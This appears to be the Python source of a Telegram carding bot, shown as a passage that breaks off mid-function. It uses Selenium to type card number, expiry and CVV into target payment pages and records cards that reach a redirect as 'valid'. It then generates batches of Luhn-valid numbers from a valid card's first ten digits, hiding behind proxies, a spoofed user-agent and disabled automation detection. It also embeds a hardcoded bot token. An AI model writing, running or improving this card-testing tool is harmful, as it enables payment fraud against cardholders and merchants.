import os
import io
import re
import sys
import time
import json
import html
import random
import zipfile
import tempfile
import asyncio
import datetime
import threading
import subprocess
from typing import Dict, List, Tuple, Optional
import csv
import urllib.parse
import requests
from bs4 import BeautifulSoup

from scraper import run_scraper, ReconScraper

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

from selenium import webdriver
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Habilitar soporte de colores ANSI y UTF-8 en Windows
os.system('')
try:
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    if hasattr(sys.stderr, 'reconfigure'):
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

# Token del Bot de Telegram proporcionado
BOT_TOKEN = "8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM"

# Rutas de archivos
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_DATA_FILE = os.path.join(BASE_DIR, "user_data.json")
LOG_FILE = os.path.join(BASE_DIR, "debug.log")
DEFAULT_CARDS_FILE = os.path.join(BASE_DIR, "a.txt")
VALIDAS_FILE = os.path.join(BASE_DIR, "validas.txt")

# Sincronización de log
print_lock = threading.Lock()

def registrar_log(bot_id, num_tarjeta, estado, mensaje):
    """Registra eventos en consola y en debug.log."""
    ahora = datetime.datetime.now().strftime("%H:%M:%S")
    estado_upper = estado.upper()
    num_mostrar = f"({num_tarjeta})" if num_tarjeta else ""
    linea = f"[{ahora}] [{estado_upper:<10}] [Bot {bot_id}] {num_mostrar}: {mensaje}\n"
    with print_lock:
        print(linea.strip())
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(linea)
        except Exception:
            pass

def guardar_tarjeta_valida_archivo(card_str: str, url: str = ""):
    """Guarda la tarjeta válida en validas.txt asegurando unicidad."""
    try:
        with print_lock:
            tarjetas_existentes = set()
            if os.path.exists(VALIDAS_FILE):
                with open(VALIDAS_FILE, "r", encoding="utf-8") as f:
                    for linea in f:
                        linea_limpia = linea.strip()
                        if linea_limpia and not linea_limpia.startswith("#"):
                            num = linea_limpia.split("|")[0].strip()
                            tarjetas_existentes.add(num)

            num_actual = card_str.split("|")[0].strip()
            if num_actual not in tarjetas_existentes:
                with open(VALIDAS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{card_str}\n")
    except Exception as e:
        print(f"[!] Error guardando tarjeta válida en archivo: {e}")

# =====================================================================
# GESTIÓN DE USUARIOS Y URLs INDEPENDIENTES
# =====================================================================

class UserManager:
    """Gestiona URLs y datos de forma independiente por cada usuario en Telegram."""
    def __init__(self, filepath=USER_DATA_FILE):
        self.filepath = filepath
        self.lock = threading.Lock()
        self.data = self._load()

    def _load(self) -> dict:
        if os.path.exists(self.filepath):
            try:
                with open(self.filepath, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                return {}
        return {}

    def _save(self):
        try:
            with open(self.filepath, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando datos de usuario: {e}")

    def get_url(self, user_id: int) -> Optional[str]:
        with self.lock:
            user_entry = self.data.get(str(user_id), {})
            return user_entry.get("url")

    def set_url(self, user_id: int, url: str):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data:
                self.data[uid] = {}
            self.data[uid]["url"] = url
            self.data[uid]["updated_at"] = datetime.datetime.now().isoformat()
            self._save()

    def delete_url(self, user_id: int):
        with self.lock:
            uid = str(user_id)
            if uid in self.data and "url" in self.data[uid]:
                del self.data[uid]["url"]
                self._save()

    def add_valid_card(self, user_id: int, card_str: str, url: str):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data:
                self.data[uid] = {}
            if "valid_cards" not in self.data[uid]:
                self.data[uid]["valid_cards"] = []

            entry = {
                "card": card_str,
                "url": url,
                "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            if not any(c.get("card") == card_str for c in self.data[uid]["valid_cards"]):
                self.data[uid]["valid_cards"].append(entry)
            self._save()

    def get_valid_cards(self, user_id: int) -> List[dict]:
        with self.lock:
            uid = str(user_id)
            return list(self.data.get(uid, {}).get("valid_cards", []))

    def set_proxy(self, user_id: int, proxy_dict: dict):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data:
                self.data[uid] = {}
            self.data[uid]["proxy"] = proxy_dict
            self.data[uid]["proxy_updated_at"] = datetime.datetime.now().isoformat()
            self._save()

    def get_proxy(self, user_id: int) -> Optional[dict]:
        with self.lock:
            uid = str(user_id)
            return self.data.get(uid, {}).get("proxy")

    def delete_proxy(self, user_id: int):
        with self.lock:
            uid = str(user_id)
            if uid in self.data and "proxy" in self.data[uid]:
                del self.data[uid]["proxy"]
                self._save()

user_manager = UserManager()

# Estado en memoria para flujos interactivos por usuario
# user_id -> {'step': str, 'pending_cards': list, 'pending_url': str}
user_conversations: Dict[int, dict] = {}

# Tareas activas de chequeo por usuario
# user_id -> {'stop_event': threading.Event(), 'driver': driver, 'running': bool}
active_jobs: Dict[int, dict] = {}

# Última tarjeta válida registrada por usuario
# user_id -> {'p16': str, 'p4': str, 'p3': str, 'card_str': str, 'url': str}
user_valid_cards: Dict[int, dict] = {}

# =====================================================================
# PARSER DE TARJETAS
# =====================================================================

def parsear_tarjetas_texto(texto: str) -> List[Tuple[str, str, str]]:
    """Extrae tarjetas en formato (16 dígitos, 4 dígitos exp MMYY, 3 dígitos CVV)."""
    if not texto:
        return []

    lineas = texto.strip().splitlines()
    tarjetas = []

    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue

        # Si viene con comando al inicio (/chk ...), quitarlo
        if linea.startswith("/"):
            partes = linea.split(maxsplit=1)
            if len(partes) > 1:
                linea = partes[1].strip()
            else:
                continue

        # Formatos separados por pipes, barras, espacios o guiones
        tokens = re.split(r"[\s|/:\-]+", linea)
        tokens = [t for t in tokens if t]

        if len(tokens) >= 4 and len(tokens[0]) >= 15 and tokens[0].isdigit():
            p16 = tokens[0]
            mm = tokens[1].zfill(2)
            yy = tokens[2][-2:] if len(tokens[2]) >= 2 else tokens[2]
            p4 = mm + yy
            p3 = tokens[3][:4]
            tarjetas.append((p16, p4, p3))
            continue
        elif len(tokens) >= 3 and len(tokens[0]) >= 15 and tokens[0].isdigit():
            p16 = tokens[0]
            p4 = tokens[1]
            p3 = tokens[2]
            tarjetas.append((p16, p4, p3))
            continue

        # Caso continuo (secuencia de dígitos)
        digitos = re.sub(r"\D", "", linea)
        if len(digitos) >= 23:
            for i in range(0, len(digitos), 23):
                bloque = digitos[i:i+23]
                if len(bloque) >= 16:
                    p16 = bloque[:16]
                    p4 = bloque[16:20] if len(bloque) >= 20 else bloque[16:]
                    p3 = bloque[20:23] if len(bloque) >= 23 else bloque[20:]
                    tarjetas.append((p16, p4, p3))
        elif len(digitos) >= 16:
            p16 = digitos[:16]
            p4 = digitos[16:20] if len(digitos) >= 20 else digitos[16:]
            p3 = digitos[20:23] if len(digitos) >= 23 else digitos[20:]
            tarjetas.append((p16, p4, p3))

    return tarjetas

def obtener_tarjetas_archivo(archivo=DEFAULT_CARDS_FILE) -> List[Tuple[str, str, str]]:
    """Lee tarjetas desde archivo si existe."""
    if not os.path.exists(archivo):
        return []
    with open(archivo, "r", encoding="utf-8") as f:
        contenido = f.read()
    return parsear_tarjetas_texto(contenido)

def formatear_tarjeta_str(p16: str, p4: str, p3: str) -> str:
    """Devuelve la tarjeta en formato estándar 0000000000000000|MM/YY|CVV"""
    exp = f"{p4[:2]}/{p4[2:]}" if len(p4) == 4 else p4
    return f"{p16}|{exp}|{p3}"

def calcular_luhn(quince: str) -> str:
    """Calcula el 16º dígito de control usando el algoritmo de Luhn."""
    suma = 0
    for i, dig in enumerate(quince):
        n = int(dig)
        if i % 2 == 0:
            n *= 2
            if n > 9:
                n -= 9
        suma += n
    return str((10 - (suma % 10)) % 10)

def generar_30_tarjetas(prefix_10: str, p4: str = "0329", p3: str = "458") -> List[str]:
    """
    Toma los primeros 10 caracteres del número de tarjeta de la válida y genera 30
    tarjetas aleatorias con formato NUMERO|MM|AA|CVV y algoritmo de Luhn verificado.
    """
    prefix_clean = re.sub(r"\D", "", str(prefix_10))[:10]
    if len(prefix_clean) < 10:
        prefix_clean = prefix_clean.ljust(10, "0")

    # Mantener el mes y año de la válida si están disponibles
    if p4 and len(p4) >= 4:
        mm = p4[:2]
        yy = p4[2:4]
    else:
        mm = f"{random.randint(1, 12):02d}"
        yy = f"{random.randint(28, 32):02d}"

    tarjetas = []
    vistos = set()
    intentos = 0
    while len(tarjetas) < 30 and intentos < 500:
        intentos += 1
        cinco_azar = f"{random.randint(0, 99999):05d}"
        quince = prefix_clean + cinco_azar
        c16 = quince + calcular_luhn(quince)
        if c16 in vistos:
            continue
        vistos.add(c16)
        cvv = f"{random.randint(100, 999):03d}"
        tarjetas.append(f"{c16}|{mm}|{yy}|{cvv}")

    return tarjetas

def parsear_proxy(texto: str) -> Optional[dict]:
    """
    Parsea cadenas de proxy en múltiples formatos:
      - curl -x http://user:pass@gw.dataimpulse.com:823
      - http://user:pass@gw.dataimpulse.com:823
      - gw.dataimpulse.com:823:user:pass
      - user:pass@gw.dataimpulse.com:823
      - host:port
    Retorna dict con 'scheme', 'host', 'port', 'user', 'pass' o None.
    """
    if not texto:
        return None
    t = texto.strip()
    t = re.sub(r"^(curl\s+)?(-x|--proxy)\s+", "", t, flags=re.IGNORECASE).strip()
    t = t.strip("\"' ")

    scheme = "http"
    if "://" in t:
        scheme, rest = t.split("://", 1)
        scheme = scheme.lower()
    else:
        rest = t

    # Formato con autenticación arroba: user:pass@host:port
    if "@" in rest:
        auth_part, host_part = rest.split("@", 1)
        user_pass = auth_part.split(":", 1)
        user = user_pass[0].strip()
        passwd = user_pass[1].strip() if len(user_pass) > 1 else ""

        host_port = host_part.split(":", 1)
        host = host_port[0].strip()
        port = host_port[1].strip() if len(host_port) > 1 else "823"
        if host and port:
            return {"scheme": scheme, "host": host, "port": port, "user": user, "pass": passwd}

    # Formato con dos puntos: host:port:user:pass o host:port
    parts = rest.split(":")
    if len(parts) >= 4:
        return {
            "scheme": scheme,
            "host": parts[0].strip(),
            "port": parts[1].strip(),
            "user": parts[2].strip(),
            "pass": ":".join(parts[3:]).strip()
        }
    elif len(parts) == 2:
        return {
            "scheme": scheme,
            "host": parts[0].strip(),
            "port": parts[1].strip(),
            "user": "",
            "pass": ""
        }

    return None

def generar_extension_proxy(proxy_info: dict) -> str:
    """Genera una extensión ZIP temporal para autenticar proxy en Edge/Chromium."""
    manifest_json = """{
    "version": "1.0.0",
    "manifest_version": 2,
    "name": "Edge Proxy Auth",
    "permissions": [
        "proxy",
        "tabs",
        "unlimitedStorage",
        "storage",
        "<all_urls>",
        "webRequest",
        "webRequestBlocking"
    ],
    "background": {
        "scripts": ["background.js"]
    }
}"""
    background_js = """
var config = {
    mode: "fixed_servers",
    rules: {
      singleProxy: {
        scheme: "%(scheme)s",
        host: "%(host)s",
        port: parseInt(%(port)s)
      },
      bypassList: ["localhost"]
    }
  };
chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
function callbackFn(details) {
    return {
        authCredentials: {
            username: "%(user)s",
            password: "%(pass)s"
        }
    };
}
chrome.webRequest.onAuthRequired.addListener(
    callbackFn,
    {urls: ["<all_urls>"]},
    ['blocking']
);
""" % proxy_info

    temp_dir = tempfile.gettempdir()
    plugin_path = os.path.join(temp_dir, f"proxy_auth_{os.getpid()}_{random.randint(1000, 9999)}.zip")
    with zipfile.ZipFile(plugin_path, "w") as zp:
        zp.writestr("manifest.json", manifest_json)
        zp.writestr("background.js", background_js)
    return plugin_path

# =====================================================================
# MOTOR SELENIUM (EDGE)
# =====================================================================

def crear_driver(es_headless=True, proxy_info=None):
    """Crea una instancia de Edge WebDriver optimizada con soporte opcional de proxy."""
    edge_options = Options()
    edge_options.page_load_strategy = 'eager'

    ext_creada = None
    if proxy_info:
        if proxy_info.get("user") and proxy_info.get("pass"):
            try:
                ext_creada = generar_extension_proxy(proxy_info)
                edge_options.add_extension(ext_creada)
            except Exception as e:
                print(f"[!] Error cargando extensión de proxy: {e}")
        else:
            edge_options.add_argument(f"--proxy-server={proxy_info['scheme']}://{proxy_info['host']}:{proxy_info['port']}")

    if es_headless:
        edge_options.add_argument("--headless=new")
        edge_options.add_argument("--disable-gpu")
        edge_options.add_argument("--window-size=1920,1080")
    else:
        edge_options.add_argument("--start-maximized")

    edge_options.add_argument("--no-sandbox")
    edge_options.add_argument("--disable-dev-shm-usage")
    edge_options.add_argument("--disable-blink-features=AutomationControlled")
    edge_options.add_argument("--disable-notifications")
    edge_options.add_argument("--log-level=3")
    edge_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    edge_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")

    driver = webdriver.Edge(options=edge_options)
    driver._proxy_extension_path = ext_creada
    driver.set_page_load_timeout(18)
    driver.set_script_timeout(10)
    return driver

def cerrar_driver_seguro(driver, bot_id=1, num_tarjeta=""):
    """Cierra el driver de forma segura y garantiza liberación de recursos."""
    if not driver:
        return

    ext_path = getattr(driver, '_proxy_extension_path', None)
    if ext_path and os.path.exists(ext_path):
        try:
            os.remove(ext_path)
        except Exception:
            pass

    registrar_log(bot_id, num_tarjeta, "CERRANDO", "Cerrando navegador...")
    driver_pid = None
    try:
        if hasattr(driver, 'service') and driver.service and driver.service.process:
            driver_pid = driver.service.process.pid
    except Exception:
        pass

    def _do_quit():
        try:
            driver.quit()
        except Exception:
            pass

    t = threading.Thread(target=_do_quit)
    t.daemon = True
    t.start()
    t.join(timeout=3.5)

    if driver_pid:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(driver_pid)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

def normalizar_texto(texto: str) -> str:
    """Pasa a minúsculas y remueve acentos."""
    if not texto:
        return ""
    texto = texto.lower()
    for con, sin in [('á', 'a'), ('é', 'e'), ('í', 'i'), ('ó', 'o'), ('ú', 'u'), ('ü', 'u')]:
        texto = texto.replace(con, sin)
    return texto

def extraer_textos_pagina(driver) -> str:
    """Extrae texto visible de ventana principal y de iframes."""
    textos = []
    js_extract = """
    function getVisibleText() {
        var b = document.body;
        if (!b) return "";
        var clone = b.cloneNode(true);
        var toRemove = clone.querySelectorAll("script, style, noscript");
        for (var i = 0; i < toRemove.length; i++) {
            toRemove[i].parentNode.removeChild(toRemove[i]);
        }
        return (clone.innerText || clone.textContent || "");
    }
    return getVisibleText();
    """
    try:
        if driver.title:
            textos.append(driver.title)
    except Exception:
        pass
    try:
        if driver.current_url:
            textos.append(driver.current_url)
    except Exception:
        pass

    try:
        driver.switch_to.default_content()
        txt_body = driver.execute_script(js_extract)
        if txt_body:
            textos.append(txt_body)
    except Exception:
        pass

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for i in range(len(iframes)):
            try:
                driver.switch_to.default_content()
                iframes_actual = driver.find_elements(By.TAG_NAME, "iframe")
                if i < len(iframes_actual):
                    driver.switch_to.frame(iframes_actual[i])
                    txt_frame = driver.execute_script(js_extract)
                    if txt_frame:
                        textos.append(txt_frame)
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

    return " \n ".join(textos)

def verificar_estado_pago(driver) -> Tuple[Optional[str], Optional[str]]:
    """
    Comprueba si la página indica VALIDA ("Redireccionando...") o ERROR ("Autenticación fallida", "error").
    """
    try:
        # Alerta nativa de javascript
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert_norm = normalizar_texto(alert_text)
            if "redireccionando" in alert_norm or "redirigiendo" in alert_norm:
                return ("VALIDA", f"Alerta: {alert_text}")
            if "error" in alert_norm or "fallida" in alert_norm or "denegada" in alert_norm:
                try:
                    alert.accept()
                except Exception:
                    pass
                return ("ERROR", f"Alerta: {alert_text}")
        except Exception:
            pass

        # Texto visible
        texto_completo = extraer_textos_pagina(driver)
        texto_norm = normalizar_texto(texto_completo)

        # Si aparece 'Redireccionando...'
        if "redireccionando" in texto_norm or "redirigiendo" in texto_norm:
            return ("VALIDA", "Redireccionando...")

        # Errores y autenticaciones fallidas
        if "autenticacion fallida" in texto_norm or "autenticacion ha fallado" in texto_norm:
            return ("ERROR", "Autenticación fallida")

        if re.search(r"\berror\b", texto_norm):
            match = re.search(r"[^\n.]{0,35}\berror\b[^\n.]{0,35}", texto_norm)
            snippet = match.group(0).strip() if match else "Error"
            return ("ERROR", f"Error detectado ({snippet})")

        if ("fallo la autenticacion" in texto_norm or 
            "pago rechazado" in texto_norm or 
            "tarjeta rechazada" in texto_norm or 
            "transaccion denegada" in texto_norm or 
            "operacion denegada" in texto_norm):
            return ("ERROR", "Operación rechazada/denegada")

    except Exception:
        pass

    return (None, None)

def hacer_clic_en_ahorrar(driver, bot_id, num_tarjeta, timeout=10) -> bool:
    """Busca el botón final (ahorrar, pagar, guardar) y hace clic."""
    registrar_log(bot_id, num_tarjeta, "BOTÓN", "Buscando botón final ('ahorrar' / 'pagar')...")
    start_time = time.time()
    
    mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZÁÉÍÓÚ"
    minus = "abcdefghijklmnopqrstuvwxyzáéíóú"
    palabras = ["ahorrar", "ahorra", "pagar", "paga", "guardar", "pay", "save", "continuar", "confirmar"]

    def buscar_y_clicar():
        for palabra in palabras:
            xpath_exp = (
                f"//*[(self::button or self::input or self::a or self::span or self::div) and ("
                f"contains(translate(text(), '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(., '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(@value, '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(@aria-label, '{mayus}', '{minus}'), '{palabra}'))]"
            )
            elementos = driver.find_elements(By.XPATH, xpath_exp)
            visibles = [el for el in elementos if el.is_displayed()]
            if visibles:
                def prioridad(el):
                    tag = el.tag_name.lower()
                    p_tag = 0 if tag in ('button', 'input') else (1 if tag == 'a' else 2)
                    p_len = len(el.text.strip()) if el.text else 50
                    return (p_tag, p_len)

                visibles.sort(key=prioridad)
                target = visibles[0]
                try:
                    driver.execute_script("arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", target)
                except Exception:
                    pass
                time.sleep(0.15)
                try:
                    target.click()
                except Exception:
                    driver.execute_script("arguments[0].click();", target)
                return True

        submits = driver.find_elements(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']")
        for sub in submits:
            if sub.is_displayed():
                try:
                    driver.execute_script("arguments[0].click();", sub)
                    return True
                except Exception:
                    pass
        return False

    try:
        while time.time() - start_time < timeout:
            try:
                if buscar_y_clicar():
                    registrar_log(bot_id, num_tarjeta, "BOTÓN", "Clic en botón final completado.")
                    driver.switch_to.default_content()
                    return True

                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        if buscar_y_clicar():
                            registrar_log(bot_id, num_tarjeta, "BOTÓN", "Clic en botón completado (iframe).")
                            driver.switch_to.default_content()
                            return True
                        driver.switch_to.default_content()
                    except Exception:
                        driver.switch_to.default_content()
            except Exception:
                pass
            time.sleep(0.3)
        return False
    finally:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

def recargar_link_cmd(driver, link, bot_id=1, num_tarjeta=""):
    """Recarga la URL inicial."""
    try:
        driver.switch_to.default_content()
    except Exception:
        pass
    try:
        driver.get(link)
    except Exception:
        try:
            driver.execute_script("window.stop();")
        except Exception:
            pass

def probar_tarjeta(driver, bot_id: int, link: str, datos_tarjeta: Tuple[str, str, str], stop_event: threading.Event) -> Tuple[str, str, Optional[str]]:
    """
    Rellena los datos de la tarjeta y evalúa el resultado.
    Retorna: (estado, detalle, redirect_url)
      - estado: 'VALIDA', 'INVALID', 'STOPPED', 'ERROR'
      - redirect_url: enlace capturado de la barra de direcciones en cuanto aparece 'Redireccionando...'
    """
    parte_16, parte_4, parte_3 = datos_tarjeta

    if stop_event.is_set():
        return ("STOPPED", "Chequeo cancelado por el usuario", None)

    try:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

        registrar_log(bot_id, parte_16, "PROBANDO", f"Cargando URL: {link}")
        try:
            driver.get(link)
        except Exception:
            try:
                driver.execute_script("window.stop();")
            except Exception:
                pass

        if stop_event.is_set():
            return ("STOPPED", "Chequeo cancelado por el usuario", None)

        wait = WebDriverWait(driver, 12)
        selector_tarjeta = "//input[@id='number' or @autocomplete='cc-number' or @autocomplete='a-number' or contains(@id, 'card') or contains(@name, 'card') or contains(@class, 'card-number')]"

        campo_input = None
        try:
            campo_input = wait.until(EC.element_to_be_clickable((By.XPATH, selector_tarjeta)))
        except Exception:
            try:
                campo_input = wait.until(EC.presence_of_element_located((By.XPATH, selector_tarjeta)))
            except Exception:
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        campo_input = driver.find_element(By.XPATH, selector_tarjeta)
                        if campo_input:
                            break
                        driver.switch_to.default_content()
                    except Exception:
                        driver.switch_to.default_content()

        if not campo_input:
            registrar_log(bot_id, parte_16, "ERROR", "No se encontró campo de tarjeta tras 12s.")
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("INVALID", "No se encontró campo de tarjeta", None)

        # 1. Número de tarjeta (16 dígitos)
        try:
            campo_input.click()
        except Exception:
            driver.execute_script("arguments[0].click();", campo_input)

        try:
            campo_input.clear()
        except Exception:
            pass
        try:
            campo_input.send_keys(Keys.CONTROL + "a")
            campo_input.send_keys(Keys.BACKSPACE)
        except Exception:
            pass

        registrar_log(bot_id, parte_16, "PROBANDO", "Escribiendo dígitos...")
        for char in parte_16:
            campo_input.send_keys(char)
            time.sleep(0.02)

        time.sleep(0.15)

        # 2. Fecha de expiración (MM/AA)
        if parte_4:
            campo_input.send_keys(Keys.TAB)
            time.sleep(0.15)
            campo_2 = driver.switch_to.active_element
            try:
                campo_2.send_keys(Keys.CONTROL + "a")
                campo_2.send_keys(Keys.BACKSPACE)
            except Exception:
                pass
            for char in parte_4:
                campo_2.send_keys(char)
                time.sleep(0.02)

            time.sleep(0.15)

            # 3. CVV
            if parte_3:
                campo_2.send_keys(Keys.TAB)
                time.sleep(0.15)
                campo_3 = driver.switch_to.active_element
                try:
                    campo_3.send_keys(Keys.CONTROL + "a")
                    campo_3.send_keys(Keys.BACKSPACE)
                except Exception:
                    pass
                for char in parte_3:
                    campo_3.send_keys(char)
                    time.sleep(0.02)

        time.sleep(0.3)

        # Comprobar si ya saltó error inmediato en el formulario
        estado_prev, detalle_prev = verificar_estado_pago(driver)
        if estado_prev == "ERROR":
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("INVALID", detalle_prev or "Error en formulario", None)

        # 4. Clic en botón final
        clicado = hacer_clic_en_ahorrar(driver, bot_id=bot_id, num_tarjeta=parte_16)
        if not clicado:
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("INVALID", "No se encontró botón final", None)

        # 5. Monitorear durante 12 segundos por "Redireccionando..." o "ERROR"
        registrar_log(bot_id, parte_16, "ESPERANDO", "Monitoreando estado durante 12s...")
        inicio_espera = time.time()
        tiempo_limite = 12.0

        while time.time() - inicio_espera < tiempo_limite:
            if stop_event.is_set():
                return ("STOPPED", "Chequeo cancelado", None)

            estado, detalle = verificar_estado_pago(driver)

            # SI DETECTA "Redireccionando..." -> VÁLIDA
            if estado == "VALIDA":
                registrar_log(bot_id, parte_16, "VALIDA", f"¡¡¡ VÁLIDA DETECTADA: {detalle} !!!")

                # Copiar rápidamente el link de arriba (URL)
                url_redireccion = None
                try:
                    url_redireccion = driver.current_url
                except Exception:
                    pass

                # Esperar hasta 2 segundos para capturar el link final si está cambiando
                limite_url = time.time() + 2.0
                while time.time() < limite_url:
                    try:
                        curr = driver.current_url
                        if curr and curr != link and curr != "about:blank":
                            url_redireccion = curr
                            break
                    except Exception:
                        pass
                    time.sleep(0.15)

                if not url_redireccion:
                    try:
                        url_redireccion = driver.current_url
                    except Exception:
                        url_redireccion = link

                registrar_log(bot_id, parte_16, "VALIDA", f"URL Copiada: {url_redireccion}")
                return ("VALIDA", detalle or "Redireccionando...", url_redireccion)

            # Si detecta error o autenticación fallida
            if estado == "ERROR":
                registrar_log(bot_id, parte_16, "ERROR", f"Detectado error: {detalle}")
                recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
                return ("INVALID", detalle or "Autenticación fallida", None)

            time.sleep(0.25)

        # Agotados los 12 segundos sin 'Redireccionando...'
        registrar_log(bot_id, parte_16, "AVISO", "12s agotados sin redirección.")
        recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
        return ("INVALID", "12s agotados sin redirección (No válida)", None)

    except Exception as e:
        registrar_log(bot_id, parte_16, "ERROR", f"Excepción en prueba: {e}")
        try:
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
        except Exception:
            pass
        return ("INVALID", f"Error: {e}", None)

# =====================================================================
# EJECUCIÓN DEL CHEQUEO ASÍNCRONO
# =====================================================================

def ejecutar_proceso_chequeo(chat_id: int, user_id: int, url: str, tarjetas: List[Tuple[str, str, str]], bot_app: Application, loop: asyncio.AbstractEventLoop):
    """
    Función síncrona que corre en hilo secundario para no congelar Telegram.
    Procesa las tarjetas secuencialmente usando Selenium Edge.
    """
    job_info = active_jobs.get(user_id)
    if not job_info:
        return

    stop_event = job_info['stop_event']
    driver = None

    def enviar_telegram(texto: str, reply_markup=None):
        """Envía mensaje a Telegram desde el hilo secundario con soporte HTML y botones."""
        try:
            coro = bot_app.bot.send_message(
                chat_id=chat_id,
                text=texto,
                parse_mode="HTML",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            return asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=10)
        except Exception as e:
            print(f"[!] Error enviando mensaje a Telegram: {e}")
            try:
                texto_limpio = re.sub(r"<[^>]+>", "", texto)
                coro = bot_app.bot.send_message(
                    chat_id=chat_id,
                    text=texto_limpio,
                    reply_markup=reply_markup,
                    disable_web_page_preview=True
                )
                return asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=10)
            except Exception:
                pass

    try:
        proxy_info = user_manager.get_proxy(user_id)
        driver = crear_driver(es_headless=True, proxy_info=proxy_info)
        job_info['driver'] = driver

        total = len(tarjetas)
        proxy_tag = f"{proxy_info['host']}:{proxy_info['port']}" if proxy_info else "Conexión directa"
        msg_inicio = (
            f"🚀 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🚀 <b><code>║       INICIANDO CHEQUEO ({total} CARDS)    ║</code></b>\n"
            f"🚀 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🌐 <b><code>URL OBJETIVO:</code></b>\n"
            f"<code>{html.escape(url)}</code>\n\n"
            f"🛡️ <b><code>PROXY:</code></b> <code>{html.escape(proxy_tag)}</code>\n"
            f"⚡ <b><code>ESTADO: Procesando tarjetas secuencialmente...</code></b>"
        )
        enviar_telegram(msg_inicio)

        for idx, tarjeta in enumerate(tarjetas, 1):
            if stop_event.is_set():
                enviar_telegram(
                    f"⏹️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                    f"⏹️ <b><code>║      CHEQUEO DETENIDO POR EL USUARIO   ║</code></b>\n"
                    f"⏹️ <b><code>╚════════════════════════════════════════╝</code></b>"
                )
                break

            p16, p4, p3 = tarjeta
            card_str = formatear_tarjeta_str(p16, p4, p3)

            estado, detalle, url_redireccion = probar_tarjeta(driver, 1, url, tarjeta, stop_event)

            if estado == "STOPPED":
                enviar_telegram(
                    f"⏹️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                    f"⏹️ <b><code>║      CHEQUEO DETENIDO POR EL USUARIO   ║</code></b>\n"
                    f"⏹️ <b><code>╚════════════════════════════════════════╝</code></b>"
                )
                break

            if estado == "VALIDA":
                url_final = url_redireccion or url
                prefix_10 = p16[:10]

                # Guardar en archivo persistente validas.txt y en perfil de usuario
                guardar_tarjeta_valida_archivo(card_str, url_final)
                user_manager.add_valid_card(user_id, card_str, url_final)

                # Registrar la tarjeta válida en memoria para el generador
                user_valid_cards[user_id] = {
                    'p16': p16,
                    'p4': p4,
                    'p3': p3,
                    'card_str': card_str,
                    'url': url_final
                }

                keyboard = [
                    [
                        InlineKeyboardButton("🌐 Nueva URL", callback_data="btn_nueva_url"),
                        InlineKeyboardButton("⚡ Generar", callback_data=f"btn_gen_{prefix_10}")
                    ]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)

                msg_valida = (
                    f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                    f"✅ <b><code>║         ¡¡¡ ESTADO: VALIDA !!!        ║</code></b>\n"
                    f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                    f"💳 <b><code>TARJETA VÁLIDA:</code></b>\n"
                    f"<code>{html.escape(card_str)}</code>\n\n"
                    f"🔗 <b><code>ENLACE DE REDIRECCIÓN:</code></b>\n"
                    f"<code>{html.escape(url_final)}</code>\n\n"
                    f"🤖 <b><code>¿Qué deseas hacer ahora? Selecciona:</code></b>"
                )
